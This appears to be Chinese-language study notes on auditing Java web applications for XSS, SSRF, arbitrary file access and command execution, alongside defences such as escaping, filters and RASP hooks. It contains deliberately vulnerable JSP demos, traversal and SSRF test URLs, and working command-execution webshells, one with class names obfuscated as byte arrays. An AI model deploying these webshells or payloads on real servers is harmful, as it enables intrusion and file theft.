攻击者利用XSS(`Cross-site scripting`)漏洞攻击可以在用户的浏览器中执行JS恶意脚本，`XSS`攻击可以实现`用户会话劫持`、`钓鱼攻击`、`恶意重定向`、`点击劫持`、`挂马`、`XSS蠕虫`等，XSS攻击类型分为：`反射型`、`存储型`、`DOM型`。

#### 反射型XSS

```jsp
<%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/9
  Time: 9:25
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%=request.getParameter("input")%>
```

payload:

```txt
http://localhost:8080/xss_ref.jsp?input=%3Cimg%20src=1%20onerror=alert(1)%20/%3E
```

#### 存储型xss

```jsp
<%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/9
  Time: 9:27
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="java.util.*" %>
<%
    String username = request.getParameter("username");
    String content = request.getParameter("content");

    String guestBookKey = "GUEST_BOOK";
    List<Map<String, String>> comments = new ArrayList<Map<String, String>>();

    if (content != null) {
        Object obj = application.getAttribute(guestBookKey);

        if (obj != null) {
            comments = (List<Map<String, String>>) obj;
        }

        Map<String, String> comment = new HashMap<String, String>();
        String              ip      = request.getHeader("x-real-ip");

        if (ip == null) {
            ip = request.getRemoteAddr();
        }

        comment.put("username", username);
        comment.put("content", content);
        comment.put("ip", ip);
        comment.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));

        comments.add(comment);

        application.setAttribute(guestBookKey, comments);
    }
%>
<html>
<head>
    <title>留言板</title>
</head>
<style>
    * {
        margin: 0;
        padding: 0;
    }
</style>
<body>
<div style="border: 1px solid #C6C6C6;">
    <div style="text-align: center;">
        <h2>在线留言板</h2>
    </div>
    <div>
        <dl>
            <%
                Object obj = application.getAttribute(guestBookKey);

                if (obj instanceof List) {
                    comments = (List<Map<String, String>>) obj;

                    for (Map<String, String> comment : comments) {
            %>
            <dd>
                <div style="min-height: 50px; margin: 20px; border-bottom: 1px solid #9F9F9F;">
                    <p><B><%=comment.get("username")%>
                    </B>[<%=comment.get("ip")%>] 于 <%=comment.get("date")%> 发表回复：</p>
                    <p style="margin: 15px 0 5px 0; font-size: 12px;">
                    <pre><%=comment.get("content")%></pre>
                    </p>
                </div>
            </dd>
            <%
                    }
                }
            %>
        </dl>
    </div>
    <div style="background-color: #fff; border: 1px solid #C6C6C6;">
        <form action="#" method="POST" style="margin: 20px;">
            昵称: <input type="text" name="username" style="width:250px; height: 28px;"/><br/><br/>
            <textarea name="content" style="overflow: auto;width: 100%; height: 250px;"></textarea>
            <input type="submit" value="提交留言" style="margin-top: 20px; width: 80px; height: 30px;"/>
        </form>
    </div>
</div>
</body>
</html>
```

#### DOM型xss

```jsp
<%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/9
  Time: 9:28
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
Date: <span style="color: red;"></span>
<input type="hidden" value="<%=request.getParameter("date")%>" />
<script>
  var date = document.getElementsByTagName("input")[0].value;
  document.getElementsByTagName("span")[0].innerHTML = date;
</script>
```



```txt
http://localhost:8080/xss_dom.jsp?date=%3Cimg%20src=1%20onerror=alert(666)%20/%3E
```

#### 防御

XSS最为常见的处理方式是转义特殊字符，后端程序在接受任何用户输入的参数时都应当优先考虑是否会存在XSS攻击。

#### htmlspecialchars

在PHP中通常会使用[htmlspecialchars](https://www.php.net/htmlspecialchars)函数会将一些可能有攻击威胁的字符串转义为html实体编码，这样可以有效的避免XSS攻击。

**示例 - htmlspecialchars 转义：** 

| 字符         | 替换后     |
| :----------- | :--------- |
| `&` (& 符号) | `&`        |
| `"` (双引号) | `"`        |
| `'` (单引号) | `'`或者`'` |
| `<` (小于)   | `<`        |
| `>` (大于)   | `>`        |

在Java中虽然没有内置如此简单方便的函数，但是我们可以通过字符串替换的方式实现类似`htmlspecialchars`函数的功能。

```java
/**
 * 实现htmlSpecialChars函数把一些预定义的字符转换为HTML实体编码
 *
 * @param content 输入的字符串内容
 * @return HTML实体化转义后的字符串
 */
public static String htmlSpecialChars(String content) {
  if (content == null) {
    return null;
  }

  char[]        charArray = content.toCharArray();
  StringBuilder sb        = new StringBuilder();

  for (char c : charArray) {
    switch (c) {
      case '&':
        sb.append("&amp;");
        break;
      case '"':
        sb.append("&quot;");
        break;
      case '\'':
        sb.append("&#039;");
        break;
      case '<':
        sb.append("&lt;");
        break;
      case '>':
        sb.append("&gt;");
        break;
      default:
        sb.append(c);
        break;
    }
  }

  return sb.toString();
}
```

在存储或者输出请求参数的时候使用该方法过滤即可实现XSS防御。

#### 全局的XSSFilter

```java
package com.anbai.sec.vuls.filter;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import java.io.IOException;

public class XSSFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) {

    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;

        // 创建HttpServletRequestWrapper，包装原HttpServletRequest对象，示例程序只重写了getParameter方法，
        // 应当考虑如何过滤：getParameter、getParameterValues、getParameterMap、getInputStream、getReader
        HttpServletRequestWrapper requestWrapper = new HttpServletRequestWrapper(request) {
            public String getParameter(String name) {
                // 获取参数值
                String value = super.getParameter(name);

                // 简单转义参数值中的特殊字符
                return value.replace("&", "&amp;").replace("<", "&lt;").replace("'", "&#039;");
            }
        };

        chain.doFilter(requestWrapper, resp);
    }

    @Override
    public void destroy() {

    }

}
```

web.xml添加XSSFilter过滤器：

```xml
<!-- XSS过滤器 -->
<filter>
  <filter-name>XSSFilter</filter-name>
  <filter-class>com.anbai.sec.vuls.filter.XSSFilter</filter-class>
</filter>

<filter-mapping>
  <filter-name>XSSFilter</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping>
```

请求XSS示例程序：[http://localhost:8000/modules/servlet/xss.jsp?input=%3Cscript%3Ealert(%27xss%27);%3C/script%3E](http://localhost:8000/modules/servlet/xss.jsp?input=alert('xss');%3C/script%3E)

![image-20201115164019678](img/107342574_image-20201115164019678.png)

经过全局过滤器转义后的参数就不会再带有XSS攻击能力了。

#### RASP XSS攻击防御

RASP可以实现类似于全局XSSFilter的请求参数过滤功能，比较稳定的一种方式是Hook到`javax.servlet.ServletRequest`接口的实现类的`getParameter/getParameterValues/getParameterMap`等核心方法，在该方法return之后插入RASP的检测代码。这种实现方案虽然麻烦，但是可以避免触发Http请求参数解析问题（Web应用无法获取`getInputStream`和乱码等问题）。

**示例 - RASP对getParameter返回值Hook示例：**

![image-20201115172732140](img/107783138_image-20201115172732140.png)

反射型的XSS防御相对来说比较简单，直接禁止GET参数中出现`<>`标签，只要出现就理解拦截，如：

```html
http://localhost:8000/modules/servlet/xss.jsp?input=<script>alert('xss');</script>
```

过滤或拦截掉`<>`后`input`参数就不再具有攻击性了。

但是POST请求的XSS参数就没有那么容易过滤了，为了兼顾业务，不能简单的使用`htmlSpecialChars`的方式直接转义特殊字符，因为很多时候应用程序是必须支持HTML标签的（如：`<img>、<h1>`等）。RASP在防御XSS攻击的时候应当尽可能的保证用户的正常业务不受影响，否则可能导致用户无法业务流程阻塞或崩溃。

为了支持一些常用的HTML标签和HTML标签属性，RASP可以通过词法解析的方式，将传入的字符串参数值解析成HTML片段，然后分析其中的标签和属性是否合法即可。

![image-20201115180617209](img/101456093_image-20201115180617209.png)

#### RASP XSS防御能力测试

**恶意的HTML标签属性XSS测试**

**示例 - 提交带有XSS攻击的Payload：**

```html
<img src='1.jpg' width='10px' height='10px' onerror='alert(/xss/);' />
```

请求示例地址：http://localhost:8000/modules/servlet/guestbook.jsp，并填写XSS攻击代码，如下图：

![image-20201115181311265](img/100071934_image-20201115181311265.png)

RASP能够正确识别并拦截XSS攻击：

![image-20201115181216802](img/102604728_image-20201115181216802.png)

**XSS富文本检测测试**

RASP如果要实现精确的XSS检测能力就必须能够正确的识别出用户传入的数据到底是否合法，经过HTML词法分析后RASP能够正确认识用户传入的参数值是否是包含了恶意的HTML标签或者属性。

**示例 - 用户在留言板中带图片回复：**

![image-20201115123956172](img/103799796_image-20201115123956172.png)

**示例 - 用户在留言板中回复被注释的HTML片段：**

![image-20201115124359270](img/109134297_image-20201115124359270.png)

![image-20201115124556231](img/103019407_image-20201115124556231.png)

经测试，RASP对XSS攻击防御能力正常，能够识别合法的HTML和javascript代码（DOM类XSS占不支持）。

#### cms 审计

全局查找`request.setAttribute`

![image-20220111120255479](img/image-20220111120255479.png)

找到一处，先看看你其查询逻辑

![image-20220111121046365](img/image-20220111121046365.png)

![image-20220111121132402](img/image-20220111121132402.png)

![image-20220111121153072](img/image-20220111121153072.png)

查询没有过滤，

在看看添加评论的操作：

![image-20220111121319280](img/image-20220111121319280.png)

![image-20220111121356173](img/image-20220111121356173.png)

![image-20220111121414050](img/image-20220111121414050.png)

无过滤，那么再找到String类型的参数插入js代码，

![image-20220111121453382](img/image-20220111121453382.png)

## SSRF篇

> 当然，SSRF是由发起网络请求的方法造成。所以先整理Java能发起网络请求的类。
>
> - HttpClient
> - [Request](http://hc.apache.org/httpcomponents-client-ga/fluent-hc/apidocs/org/apache/http/client/fluent/Request.html) (对HttpClient封装后的类)
> - HttpURLConnection
> - URLConnection
> - URL
> - okhttp
>
> 如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。

对用户输入过滤不严

ssrf作用：

对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。

攻击运行在内网或者本地的应用程序。

对内网web应用进行指纹识别，通过访问默认文件实现 。

攻击内外网的web应用。sql注入、struct2、redis等。

利用file协议读取本地文件等。

php ssrf中的伪协议：

```
file dict sftp ldap tftp gopher
```

Java ssrf 中的伪协议：

```
file ftp mailto http https jar netdoc
```

demo:

```java
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

@WebServlet("/ssrf")
public class SsrfServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String url = req.getParameter("url");
        String htmlContent;
        PrintWriter writer = resp.getWriter(); // 获取响应的打印流对象
        URL url1 = new URL(url);
        URLConnection urlConnection = url1.openConnection();  // 打开一个url连接，并进行客户端访问资源
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), "UTF-8")); // 获取 url 中的资源
        StringBuffer html = new StringBuffer();
        while ((htmlContent=bufferedReader.readLine()) != null){
            html.append(htmlContent);
        }
        bufferedReader.close();

        writer.println(html);
        writer.flush();
    }
}
```

http://localhost:8089/ssrf?url=http://www.baidu.com

![image-20220111142926759](img/image-20220111142926759.png)

http://localhost:8089/ssrf?url=file:///c:/windows/win.ini

![image-20220111142940858](img/image-20220111142940858.png)

https://xz.aliyun.com/t/206/

SSRF续其他类： https://www.cnblogs.com/nice0e3/p/13683023.html

## 文件类漏洞篇

##### 1. 文件访问类漏洞

我们通常把这类漏洞归为一个类型，因为产生漏洞的原因都是因为程序对文件或目录访问控制不严、程序内部逻辑错误导致的任意文件或目录恶意访问漏洞。

##### 2. 任意文件读取

任意文件读取漏洞因为没有验证请求的资源文件是否合法导致的。此类漏洞在Java中有着较高几率出现。

```jsp
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileInputStream" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 21:12
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    File file = new File(request.getRealPath("/") + request.getParameter("name"));
    FileInputStream fileInputStream = new FileInputStream(file);
    int tempbyte;
    while ((tempbyte = fileInputStream.read())!=-1){
        out.write(tempbyte);
    }
    fileInputStream.close();
%>
```

读取jsp源代码

```txt
http://localhost:8080/file_read.jsp?name=file_read.jsp
```

读取`WEB-INF/web.xml`

```txt
http://localhost:8080/file_read.jsp?name=WEB-INF/web.xml
```

读取敏感文件

```txt
http://localhost:8080/file_read.jsp?name=../../../../../../etc/passwd
```

##### 3. 写文件

```jsp
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.charset.StandardCharsets" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 21:27
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    File file = new File(request.getParameter("filename"));
    FileOutputStream fos = new FileOutputStream(file);
    fos.write(request.getParameter("content").getBytes(StandardCharsets.UTF_8));
    fos.flush();
    fos.close();

    out.println(file.getAbsoluteFile()+"\n"+file.exists());
%>
```

写文件

```txt
http://localhost:8080/file_write.jsp?filename=1.txt&content=666

http://localhost:8080/file_write.jsp?filename=D:/1.txt&content=666
```

##### 4. 删除文件

```jsp
<%@ page import="java.io.File" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 21:36
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    File file = new File(request.getParameter("file"));
    boolean delete = file.delete();
    out.println(delete);
%>
```

删除文件

```jsp
http://localhost:8080/file_del.jsp?file=D:/1.TXT
```

**反射删除文件**

```jsp
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.File" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 21:43
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  String file = request.getParameter("file");
  Method method = Class.forName("java.io.DefaultFileSystem").getMethod("getFileSystem");
    method.setAccessible(true);
  Object fs = method.invoke(null);

  Method method1 = fs.getClass().getMethod("delete", File.class);
  method1.setAccessible(true);
  Boolean aBoolean = (Boolean) method1.invoke(fs, new File(file));
  out.println(aBoolean);
%>
```

```txt
http://localhost:8080/file_del_ref.jsp?file=D:/1.TXT
```

##### 5. 文件/目录复制、移动

```jsp
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.nio.file.Path" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 21:58
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Path path = Files.copy(Paths.get(request.getParameter("source")), Paths.get(request.getParameter("dest")));
    out.println(path);
%>
```

复制文件

```txt
http://localhost:8080/file_copy.jsp?source=D:/1.txt&dest=d:/2.txt
```

我们可以将任意文件类型复制为 jsp 后门，扩大其危害。

##### 6. 重命名文件

```jsp
<%@ page import="java.io.File" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 22:06
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  String source = request.getParameter("source");
  String dest = request.getParameter("dest");
  File file1 = new File(source);
  File file2 = new File(dest);
  file1.renameTo(file2);

  out.println(file2+"\n"+file2.exists());
%>
```

重命名为 jsp 文件。

```txt
http://localhost:8080/file_rename.jsp?source=D:/1.txt&dest=d:/1.jsp
```

##### 7. 文件目录遍历

```jsp
<%@ page import="java.io.File" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 22:13
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  String[] list = new File(request.getParameter("dir")).list();
  for (String s : list) {
    out.println(s);
  }
%>
```

遍历根目录

```txt
http://localhost:8080/file_list.jsp?dir=/
```

##### 8. NIO任意文件读取

```jsp
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 22:18
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  byte[] bytes = Files.readAllBytes(Paths.get(request.getParameter("file")));
  out.println(new String(bytes));
%>
```

任意文件读取：

```txt
http://localhost:8080/file_NIO_read.jsp?file=D:/2.txt
```

##### 9. 任意文件/目录访问漏洞修复

1. 限制读取目录或文件

在读取文件或者目录的时候我们需要考虑到文件读取安全问题，严格控制用户传入参数，禁止限制用户传入路径。

```JSP
<%@ page import="java.io.File" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/8
  Time: 22:30
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
  // 定义限制用户遍历的文件目录常量
  private static final String IMAGE_DIR = "D:\\1";
%>
<%
  // 定义所需遍历的目录
  String dirStr = request.getParameter("dir");
  if (dirStr != null){
    File dir = new File(dirStr);

    // 获取文件绝对路径，转换成标准的文件路径
      String fileDir = (dir.getAbsoluteFile().getCanonicalFile()+"").replace("\\\\", "/").replaceAll("/+", "/");
      out.println(fileDir);

      // 检查当前用户传入的目录是否包含在系统限定的目录下
    if (fileDir.startsWith(IMAGE_DIR)){
      String[] list = dir.list();

      for (String s : list) {
        out.println(s);
      }
    }else {
      out.println("目录不合法");
    }
  }
%>
```



```TXT
http://localhost:8080/file_list_check.jsp?dir=D:/1
```

2. RASP防御恶意文件访问攻击

RASP可以使用Agent机制实现Hook任意的Java类API，因此可以轻易的捕获到Java程序读取的任意文件路径。RASP可以将Hook到的文件路径和Http请求的参数进行关联分析，检测Java读取的文件路径是否会受到Http请求参数的控制，如果发现请求参数最终拼接到了文件路径中应当立即阻断文件访问行为，并记录攻击日志。

为了提升RSAP的防御能力，应当将 JavaSE中所有与文件读写相关的最为底层的Java API 类找出来，然后添加监视点。

**`Java 底层操作IO的API表（<=HDK14）`**

| 类名                                 | 类型      | 重要方法                                                     |
| ------------------------------------ | --------- | ------------------------------------------------------------ |
| `java.io.WinNTFileSystem`            | `java.io` | `delete/list/createDirectory/rename/setLastModifiedTime/listRoots` |
| `java.io.UnixFileSystem`             | `java.io` | `delete/list/createDirectory/rename/setLastModifiedTime/listRoots` |
| `java.io.FileInputStream`            | `java.io` | `open/read`                                                  |
| `java.io.FileOutputStream`           | `java.io` | `open/write`                                                 |
| `java.io.RandomAccessFile`           | `java.io` | `read/write/seek`                                            |
| `sun.nio.ch.FileChannelImpl`         | `sun.nio` | `open/read/map/transferTo0`                                  |
| `sun.nio.ch.FileDispatcher`          | `sun.nio` | `read/pread/readv/write/pwrite/writev/seek`                  |
| `sun.nio.ch.SocketDispatcher`        | `sun.nio` | `read/readv/write/writev`                                    |
| `sun.nio.ch.DatagramDispatcher`      | `sun.nio` | `read/readv/write/writev`                                    |
| `sun.nio.fs.UnixNativeDispatcher`    | `sun.nio` | `fopen/read/write/getcwd/link/unlink/rename/mkdir/chown`     |
| `sun.nio.fs.WindowsNativeDispatcher` | `sun.nio` | `fopen/read/write/getcwd/link/unlink/rename/mkdir/chown`     |
| `sun.nio.fs.UnixCopyFile`            | `sun.nio` | `copy/copyDirectory/copyFile/move/copyLink/copySpecial/transfer` |
| `sun.nio.ch.IOUtil`                  | `sun.nio` | `read/write/randomBytes`                                     |

**Java IO 底层API关系图**

![image-20201113121413510](img/108853966_image-20201113121413510.png)

**RASP防御思路：**

![image-20201112225033039](img/103879365_image-20201112225033039.png)

当RASP检测到恶意的文件访问后会立即阻断文件读取：

![image-20201113223619874](img/103290371_image-20201113223619874.png)

3. 禁止文件名空字节访问

在低版本的JDK中允许文件名中包含`空字节`（俗称%00截断），为了防止该问题，RASP应当在任何文件被访问的时候检测文件名是否包含了空字节，如果有应当立即终止文件的访问。

**检测文件名空字节示例代码：**

```jsp
/**
 * 检查文件名中是否包含了空字节，禁止出现%00字符截断
 *
 * @param file 访问文件
 * @return 是否包含空字节
 */
private static boolean nullByteValid(File file) {
   return file.getName().indexOf('\u0000') < 1;
}
```

4. 禁止写入动态脚本文件

为了避免Web应用被写入恶意的WebShell后门文件，RASP应当在Web应用启动后禁止任何动态脚本的写入操作。在任何与写入文件相关的Java底层方法执行前都应当检测写入的文件后缀是否合法。

禁止写入如下类型的动态脚本文件：

```
jsp,jspx,jspa,jspf,asp,asa,cer,aspx,php
```

文件写入检测应当处理各类文件写入事件，如：`写文件、重命名文件、复制/移动文件、移动目录`；RASP设置Hook点时也应当严格处理上述IO操作的类文件（一个都不能漏掉，漏掉一个几乎等于全功尽弃），如果新版本的JDK新增或修改了底层IO操作类应当做同步支持。

5. 文件名和请求参数关联分析

RASP应当分析Hook到的文件路径和请求参数的关联性，分析每一个参数是否对最终Hook到的文件路径有必然的关联关系。

如传入的某个参数最终和Hook到的文件路径完全一致，那么应当立即禁止文件访问请求，因为即便用户请求的不是恶意文件也肯定是一个存在任意文件读取漏洞的业务功能，攻击者可以修改传入的参数实现读取服务器中的任意文件。

6. 文件名检测规则和黑名单

攻击者在验证文件读取类漏洞时通常会使用一些常用的技巧和路径，如：`WEB-INF/web.xml`、`/etc/passwd`、`../../../../../../../etc/passwd`等。RASP应该有一些内置的黑名单和检测规则来防止黑客攻击。

##### 10. Java恶意文件访问审计建议

在审计文件读取功能时要非常仔细，或许很容易就会有意想不到的收获。

在IDEA中可以中可以重点搜索：

1. **JDK原始的`java.io.FileInputStream`、`java.io.FileOutputStream`类**；
2. **JDK原始的`java.io.RandomAccessFile`类**；
3. **Apache Commons IO提供的`org.apache.commons.io.FileUtils`类**；
4. JDK1.7新增的基于NIO非阻塞异步读取文件的`java.nio.channels.AsynchronousFileChannel`类；
5. JDK1.7新增的基于NIO读取文件的`java.nio.file.Files`类。常用方法如:`Files.readAllBytes`、`Files.readAllLines`；
6. `java.io.File`类的`list`、`listFiles`、`listRoots`、`delete`方法；

除此之外，还可以搜索一下`FileUtil/FileUtils`很有可能用户会封装文件操作的工具类。

##### 11. Java恶意文件访问总结

首先，在Java中任意文件或目录恶意访问漏洞是一种非常常见的高危漏洞！多是因为程序内部逻辑错误或者过于信任用户传入的参数导致的。其次此类漏洞原理简单在渗透测试或代码审计时非常容易发现且漏洞影响重大，因为攻击者可以直接操纵服务器中的文件或目录，所以在程序开发过程中我们应该高度重视编码规范、程序逻辑严谨性防止该漏洞发生。

## 命令执行篇

##### 1. Java本地命令执行

Java原生提供了对本地系统命令执行的支持，黑客通常会`RCE利用漏洞`或者`webshell`来执行系统中断命令控制服务器的目的。

对于开发者来说执行本地命令来实现某些程序功能(如:ps 进程管理、top内存管理等)是一个正常的需求，而对于黑客来说`本地命令执行`是一种非常有利的入侵手段。

##### 2. Runtime命令执行

在Java中通常会使用`java.lang.Runtime`类的`exec`方法来执行本地系统命令。

![image-20210907181803424](img/image-20210907181803424.png)

![image-20210907181828395](img/image-20210907181828395.png) 

**测试**

无回显：

```jsp
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

有回显：

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/7
  Time: 18:49
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%
    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;
    while ((a = in.read(b)) != -1 ){
        baos.write(b,0,a);
    }
    out.write(new String(baos.toByteArray()));
%>
```

**Runtime命令执行调用链**

`Runtime.exec(xxx)` 调用链如下：

**反射Runtime命令执行**

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/7
  Time: 18:49
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=GBK" language="java" %>
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%

    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;
    while ((a = in.read(b)) != -1 ){
        baos.write(b,0,a);
    }
    out.write(new String(baos.toByteArray()));
%>
```

##### 3.ProcessBuilder命令执行

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %><%--
  Created by IntelliJ IDEA.
  User: yanmie
  Date: 2021/9/7
  Time: 20:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  InputStream inputStream = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
  byte[] bytes = new byte[1024];
  int a = -1;
  while ((a = inputStream.read(bytes))!=-1){
    byteArrayOutputStream.write(bytes,0,a);
  }
  out.write(new String(byteArrayOutputStream.toString()));
%>
```

##### 4. UNIXProcess/ProcessImpl

linux

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    InputStream start(String[] strs) throws Exception {
        // java.lang.UNIXProcess
        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});

        // java.lang.ProcessImpl
        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});

        Class clazz = null;

        // 反射创建UNIXProcess或者ProcessImpl
        try {
            clazz = Class.forName(unixClass);
        } catch (ClassNotFoundException e) {
            clazz = Class.forName(processClass);
        }

        // 获取UNIXProcess或者ProcessImpl的构造方法
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream  f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }

        // 创建UNIXProcess或者ProcessImpl实例
        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );

        // 获取命令执行的InputStream
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        return (InputStream) inMethod.invoke(object);
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }
%>
<%
    String[] str = request.getParameterValues("cmd");

    if (str != null) {
        InputStream in     = start(str);
        String      result = inputStreamToString(in, "UTF-8");
        out.println("<pre>");
        out.println(result);
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

## XXE篇

https://www.cnblogs.com/nice0e3/p/13746076.html

https://xz.aliyun.com/t/3357

# 序列化与反序列化

## 概念

> Java是面向对象的计算机语言，序列化并不是Java语言独有的一种机制，它表示将一个对象的状态信息转换成为可存储或者可传输的数据格式的过程；在序列化过程中，对象的状态可以写入的临时或者永久的存储区，需要再次使用这个对象时，就用反序列化的方式将该对象直接还原。

静态域修饰的内容在Java里面隶属于类而不是对象，所以在对象状态里不包含静态成员。

- 将Java的对象(某个时刻的状态)转换成字节序列的过程称为Java的序列化过程
- 将字节序列转化成为Java对象的过程称为Java反序列化过程

还有另外已于人阅读的序列化： XML序列化,json序列化。

#### 主要接口和类

Java序列化的实现需要依赖几个主要的接口和类: Serializable、Externalizable、ObjectOutputStream、ObjectInputStream。

- java.io.Serializable : 实现了此接口的类才会启用序列化功能。否则会在序列化过程报错。

- java.io.Externalizable: Java提供了一种自定义序列化过程的方法，让该对象实现`Externalizble`接口，此接口必须让实现者提供两个读取和写入的实现方法。

  ```
  public interface Externalizable extends java.io.Serializable {
  ```

  ```
      void writeExternal(ObjectOutput out) throws IOException;
  ```

  ```
      void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;
  ```

  ```
  }
  ```

  这两个方法为读取和写入的详细实现过程，有实现者自己定义。

